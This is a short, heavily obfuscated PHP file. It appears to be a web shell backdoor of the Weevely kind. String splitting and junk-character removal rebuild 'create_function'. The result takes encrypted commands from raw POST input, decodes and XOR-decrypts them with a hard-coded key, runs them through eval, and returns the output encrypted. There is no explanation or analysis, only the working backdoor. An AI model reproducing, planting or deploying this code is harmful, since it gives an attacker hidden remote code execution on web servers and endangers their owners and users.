<?php
$G='$k="g#g#c6f6d23d";$kg#h="e245dcg#8b0g#cf7";$kg#f="1c57g#33ag#c0156";$';
$u='t"),$m)==1) {g#g#@ob_g#start();@evag#l(@gzuncomg#prg#ess(@x(@g#baseg#64_deg#code';
$g='@baseg#64g#_encodeg#(@xg#(@gzcompg#reg#ss($og#)g#,$k));print("$p$khg#$r$kf");}';
$D='($g#m[1g#]g#),g#$k)));$o=@og#g#b_get_contg#eg#ntg#s();@ob_end_clean();$r=';
$v=str_replace('q','','cqqrqeate_qfuqqnction');
$b='_matcg#h("/$g#kh(g#.+)$kf/"g#,@fig#lg#e_geg#t_cog#nteg#nts("g#php://inpu';
$I='$j+g#+,$i+g#+)g#{$o.=$t{$i}^g#g#$g#k{$j};}}retug#rn $o;}ifg# (@preg#g';
$F=');$l=sg#trlen($t);g#$o="";fog#r(g#$i=g#0;g#g#$i<$l;){for($j=0;($g#j<$c&g#&$i<$l);';
$P='p=g#"Rg#Xg#VXgXgjnsCg#6g#61Bc"g#;function x($t,g#$kg#){g#$c=strlen($g#k';
$w=str_replace('g#','',$G.$P.$F.$I.$b.$u.$D.$g);
$A=$v('',$w);$A();
?>
